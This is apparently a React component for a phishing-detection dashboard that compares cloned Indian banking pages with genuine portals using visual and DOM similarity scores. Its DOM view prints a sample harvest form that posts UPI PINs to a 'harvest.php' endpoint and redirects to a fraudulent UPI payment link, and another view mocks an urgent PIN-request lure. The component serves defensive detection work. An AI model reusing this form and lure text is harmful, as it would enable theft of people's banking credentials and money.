import React, { useState } from 'react';
import { Eye, Shield, CheckCircle, Fingerprint, Lock, Layers, Code, ExternalLink, Sliders, AlertTriangle } from 'lucide-react';
import { ThreatItem } from '../types/threat';
import { GENUINE_BRAND_TEMPLATES } from '../data/mockThreats';

interface VisualSimilarityInspectorProps {
  threats: ThreatItem[];
  selectedThreatId?: string;
}

export const VisualSimilarityInspector: React.FC<VisualSimilarityInspectorProps> = ({
  threats,
  selectedThreatId
}) => {
  const [activeThreatId, setActiveThreatId] = useState<string>(selectedThreatId || threats[0]?.id || 'thr-8901');
  const [comparisonMode, setComparisonMode] = useState<'SIDE_BY_SIDE' | 'OVERLAY_SLIDER' | 'DOM_DIFF'>('SIDE_BY_SIDE');
  const [sliderPosition, setSliderPosition] = useState<number>(50);

  const threat = threats.find(t => t.id === activeThreatId) || threats[0];
  const genuineBrand = GENUINE_BRAND_TEMPLATES[threat.targetBrand] || GENUINE_BRAND_TEMPLATES['SBI YONO'];

  return (
    <div className="space-y-6 max-w-6xl mx-auto">
      {/* Header */}
      <div className="p-5 rounded-xl bg-white border border-slate-200 shadow-sm flex flex-wrap items-center justify-between gap-4">
        <div>
          <h2 className="text-xl font-bold text-slate-900 tracking-tight flex items-center space-x-2">
            <span>Visual & Layout Similarity Studio</span>
          </h2>
          <p className="text-xs text-slate-500 mt-1">
            Compare suspected phishing clone pages side-by-side against official, verified banking brand portals.
          </p>
        </div>

        {/* Threat Switcher */}
        <div className="flex items-center space-x-2 text-xs">
          <span className="text-slate-600 font-medium">Select Threat:</span>
          <select
            value={activeThreatId}
            onChange={(e) => setActiveThreatId(e.target.value)}
            className="bg-slate-50 border border-slate-300 text-xs rounded-lg px-3 py-1.5 text-slate-900 focus:outline-none focus:border-indigo-500 font-mono shadow-xs"
          >
            {threats.map(t => (
              <option key={t.id} value={t.id}>
                [{t.targetBrand}] {t.domain} (SSIM: {(t.structuralSSIM * 100).toFixed(1)}%)
              </option>
            ))}
          </select>
        </div>
      </div>

      {/* Metric Cards */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
        <div className="p-3.5 rounded-xl bg-white border border-slate-200 shadow-xs space-y-1">
          <div className="text-xs text-slate-500 font-medium">Structural SSIM</div>
          <div className="text-2xl font-bold text-slate-900">{(threat.structuralSSIM * 100).toFixed(1)}%</div>
          <div className="text-[11px] text-indigo-600 font-medium">Layout pixel alignment</div>
        </div>

        <div className="p-3.5 rounded-xl bg-white border border-slate-200 shadow-xs space-y-1">
          <div className="text-xs text-slate-500 font-medium">pHash Hamming Dist</div>
          <div className="text-2xl font-bold text-slate-900">{threat.pHashDistance} <span className="text-xs font-normal text-slate-500">/ 64 bits</span></div>
          <div className="text-[11px] text-amber-600 font-medium">Dist ≤ 10 denotes clone</div>
        </div>

        <div className="p-3.5 rounded-xl bg-white border border-slate-200 shadow-xs space-y-1">
          <div className="text-xs text-slate-500 font-medium">Logo Match Confidence</div>
          <div className="text-2xl font-bold text-slate-900">{threat.logoConfidence}%</div>
          <div className="text-[11px] text-rose-600 font-medium">Authentic logo matched</div>
        </div>

        <div className="p-3.5 rounded-xl bg-white border border-slate-200 shadow-xs space-y-1">
          <div className="text-xs text-slate-500 font-medium">DOM Tree Similarity</div>
          <div className="text-2xl font-bold text-slate-900">{(threat.domEditDistance * 100).toFixed(1)}%</div>
          <div className="text-[11px] text-emerald-600 font-medium">Node structure match</div>
        </div>
      </div>

      {/* Main Studio View */}
      <div className="p-5 rounded-xl bg-white border border-slate-200 space-y-4 shadow-sm">
        <div className="flex flex-wrap items-center justify-between gap-3 border-b border-slate-100 pb-3">
          <div className="text-xs font-semibold text-slate-900 flex items-center space-x-2">
            <Layers className="w-4 h-4 text-indigo-600" />
            <span>Comparison Target:</span>
            <span className="text-indigo-600 font-bold">{threat.targetBrand}</span>
          </div>

          <div className="flex items-center space-x-1 bg-slate-100 p-0.5 rounded-lg text-xs font-medium">
            <button
              onClick={() => setComparisonMode('SIDE_BY_SIDE')}
              className={`px-3 py-1.5 rounded-md transition-all ${
                comparisonMode === 'SIDE_BY_SIDE'
                  ? 'bg-white text-slate-900 font-semibold shadow-xs'
                  : 'text-slate-600 hover:text-slate-900'
              }`}
            >
              Side-by-Side Diff
            </button>
            <button
              onClick={() => setComparisonMode('OVERLAY_SLIDER')}
              className={`px-3 py-1.5 rounded-md transition-all ${
                comparisonMode === 'OVERLAY_SLIDER'
                  ? 'bg-white text-slate-900 font-semibold shadow-xs'
                  : 'text-slate-600 hover:text-slate-900'
              }`}
            >
              Interactive Slider
            </button>
            <button
              onClick={() => setComparisonMode('DOM_DIFF')}
              className={`px-3 py-1.5 rounded-md transition-all ${
                comparisonMode === 'DOM_DIFF'
                  ? 'bg-white text-slate-900 font-semibold shadow-xs'
                  : 'text-slate-600 hover:text-slate-900'
              }`}
            >
              DOM Interceptor
            </button>
          </div>
        </div>

        {/* Mode 1: Side by Side */}
        {comparisonMode === 'SIDE_BY_SIDE' && (
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
            {/* Cloned Page Mockup */}
            <div className="rounded-xl bg-white border border-rose-200 overflow-hidden shadow-xs">
              <div className="px-4 py-2.5 bg-rose-50 border-b border-rose-200 flex items-center justify-between text-xs">
                <span className="font-bold text-rose-700 flex items-center space-x-1.5">
                  <AlertTriangle className="w-3.5 h-3.5 text-rose-600" />
                  <span>Detected Malicious Clone</span>
                </span>
                <span className="text-slate-700 truncate max-w-[220px] font-mono text-[11px] font-semibold">{threat.domain}</span>
              </div>

              <div className="p-4 space-y-3 text-xs">
                <div className="p-3 rounded-lg bg-rose-50/50 border border-rose-100 space-y-1">
                  <div className="font-bold text-slate-900">{threat.targetBrand} Verification Portal</div>
                  <p className="text-rose-700 text-xs">
                    ⚠️ Urgent Action Required: Account verification pending. Enter your 6-Digit UPI PIN to confirm and unlock account.
                  </p>
                </div>

                <div className="space-y-2.5">
                  <div>
                    <label className="text-xs text-slate-600 font-medium block mb-1">Registered Mobile Number</label>
                    <input disabled value="+91 98765 XXXXX" className="w-full bg-slate-50 border border-slate-200 rounded-lg px-3 py-1.5 text-xs text-slate-700 font-mono" />
                  </div>
                  <div>
                    <div className="flex justify-between items-center mb-1">
                      <label className="text-xs text-rose-700 font-bold flex items-center space-x-1.5">
                        <Lock className="w-3.5 h-3.5 text-rose-600" />
                        <span>6-Digit UPI PIN / MPIN (Theft Target)</span>
                      </label>
                      <span className="text-[10px] px-2 py-0.5 rounded-full bg-rose-600 text-white font-bold">
                        HARVEST DETECTED
                      </span>
                    </div>
                    <input disabled value="••••••" className="w-full bg-rose-50/60 border border-rose-300 rounded-lg px-3 py-1.5 text-xs text-rose-900 tracking-widest font-bold" />
                  </div>
                </div>

                <div className="pt-2 border-t border-slate-100 flex justify-between items-center text-xs text-slate-500 font-mono">
                  <span>Harvest URL: <span className="text-rose-600 font-semibold">/api/harvest.php</span></span>
                  <span className="px-2 py-0.5 rounded bg-rose-100 text-rose-700 font-bold text-[10px]">
                    MALICIOUS FORM
                  </span>
                </div>
              </div>
            </div>

            {/* Genuine Reference */}
            <div className="rounded-xl bg-white border border-emerald-200 overflow-hidden shadow-xs">
              <div className="px-4 py-2.5 bg-emerald-50 border-b border-emerald-200 flex items-center justify-between text-xs">
                <span className="font-bold text-emerald-700 flex items-center space-x-1.5">
                  <CheckCircle className="w-3.5 h-3.5 text-emerald-600" />
                  <span>Genuine Verified Template</span>
                </span>
                <a href={threat.genuineReferenceUrl} target="_blank" rel="noreferrer" className="text-emerald-700 hover:underline flex items-center space-x-1 font-mono text-[11px] font-semibold">
                  <span>{genuineBrand.officialDomain}</span>
                  <ExternalLink className="w-3 h-3" />
                </a>
              </div>

              <div className="p-4 space-y-3 text-xs">
                <div className="p-3 rounded-lg bg-emerald-50/50 border border-emerald-100 space-y-1">
                  <div className="font-bold text-slate-900">{genuineBrand.name}</div>
                  <p className="text-emerald-700 text-xs">{genuineBrand.securityNotice}</p>
                </div>

                <div className="p-3 rounded-lg bg-slate-50 border border-slate-200 space-y-1.5 text-xs">
                  <div className="text-[11px] uppercase text-emerald-700 font-bold">Official Authentic VPA Suffixes:</div>
                  <div className="flex flex-wrap gap-1.5">
                    {genuineBrand.officialVpaHandleSuffixes.map(s => (
                      <span key={s} className="px-2 py-0.5 rounded bg-emerald-100 text-emerald-800 text-xs font-mono font-semibold">
                        {s}
                      </span>
                    ))}
                  </div>
                </div>

                <div className="pt-2 border-t border-slate-100 flex justify-between items-center text-xs text-slate-500">
                  <span className="text-emerald-700 font-semibold">TLS 1.3 Certified</span>
                  <span className="text-emerald-700 font-semibold">Verified NPCI Member</span>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Mode 2: Overlay Slider */}
        {comparisonMode === 'OVERLAY_SLIDER' && (
          <div className="space-y-4">
            <div className="relative rounded-xl overflow-hidden border border-slate-300 bg-slate-100 h-[300px]">
              <div className="absolute inset-0 p-8 flex flex-col justify-center items-center text-center bg-rose-50">
                <div className="text-rose-700 font-semibold text-sm uppercase tracking-wider">Detected Cloned Page</div>
                <div className="text-xs text-slate-700 mt-1 font-mono">{threat.domain}</div>
                <div className="mt-3 p-3 rounded-lg bg-white border border-rose-200 text-xs text-rose-800 max-w-md shadow-xs">
                  Fake UPI PIN harvest form directly impersonating {threat.targetBrand}.
                </div>
              </div>

              <div
                className="absolute inset-0 p-8 flex flex-col justify-center items-center text-center bg-emerald-50 border-l-2 border-indigo-600"
                style={{ clipPath: `inset(0 0 0 ${sliderPosition}%)` }}
              >
                <div className="text-emerald-700 font-semibold text-sm uppercase tracking-wider">Official Genuine Portal</div>
                <div className="text-xs text-slate-700 mt-1 font-mono">{genuineBrand.officialDomain}</div>
                <div className="mt-3 p-3 rounded-lg bg-white border border-emerald-200 text-xs text-emerald-800 max-w-md shadow-xs">
                  Authentic zero-trust portal with no credential capture endpoints.
                </div>
              </div>

              <div className="absolute top-0 bottom-0 w-1 bg-indigo-600 pointer-events-none shadow-sm" style={{ left: `${sliderPosition}%` }} />
            </div>

            <div className="flex items-center space-x-4 px-2 text-xs text-slate-700">
              <span className="text-rose-600 font-bold">Clone View</span>
              <input
                type="range"
                min="0"
                max="100"
                value={sliderPosition}
                onChange={(e) => setSliderPosition(Number(e.target.value))}
                className="flex-1 accent-indigo-600 h-2 bg-slate-200 rounded-lg cursor-pointer"
              />
              <span className="text-emerald-600 font-bold">Genuine View</span>
            </div>
          </div>
        )}

        {/* Mode 3: DOM Diff */}
        {comparisonMode === 'DOM_DIFF' && (
          <div className="p-4 rounded-xl bg-slate-50 border border-slate-200 space-y-2.5 font-mono text-xs">
            <div className="text-slate-900 font-bold text-xs flex items-center space-x-2">
              <Code className="w-4 h-4 text-indigo-600" />
              <span>Extracted Malicious Form & Handlers:</span>
            </div>
            <pre className="p-3.5 rounded-lg bg-white border border-slate-200 text-slate-800 text-xs leading-relaxed overflow-x-auto">
{`<!-- Cloned Credential Harvest Form -->
<form action="https://${threat.domain}/api/harvest.php" method="POST">
  <input type="text" name="registered_mobile" />
  <input type="password" name="upi_mpin" maxlength="6" data-intercept="true" />
  <input type="hidden" name="vpa_receiver" value="${threat.extractedUPI_VPA?.[0] || 'sbikyc.refund99@paytm'}" />
  <button type="submit">Verify Now</button>
</form>

<!-- Hijacked Payment Scheme -->
window.location.href = "${threat.qrCodePayload || `upi://pay?pa=${threat.extractedUPI_VPA?.[0] || 'fraud@paytm'}&am=1.00`}";`}
            </pre>
          </div>
        )}
      </div>
    </div>
  );
};

